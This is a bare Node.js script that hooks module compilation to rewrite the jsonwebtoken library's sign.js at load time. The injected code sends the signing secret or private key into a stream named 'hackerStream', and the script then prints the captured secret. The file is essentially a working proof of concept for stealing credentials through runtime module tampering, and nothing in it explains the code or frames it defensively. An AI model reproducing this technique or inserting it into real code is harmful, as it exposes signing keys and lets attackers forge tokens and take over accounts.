'use strict';
const Hook = require('compile-hook');
const Acorn = require('acorn-jsx');
const Falafel = require('falafel');

const hijack = function (script) {

    return Falafel(script, { parser: Acorn }, function (node) {

        if (node.type === 'AssignmentExpression' && node.source().includes('module.exports')) {
            node.update('var hackerStream = new require(\'stream\').PassThrough();\n' + node.source() + '\nmodule.exports.hackerStream = hackerStream;' + '\n');
        }

        if (node.source() === 'options = options || {};') {
            node.update(node.source() + '\n' + 'hackerStream.push(secretOrPrivateKey)');
        }
    });
};

Hook.placeHook((content, filename, done) => {

    if (filename.includes('/sign.js')) {

        done(hijack(content));
    }
    else {
        done();
    }
});


const jwt = require('jsonwebtoken');

jwt.sign.hackerStream.on('data', (raw) => {
    
    console.log('secret', raw.toString());
});

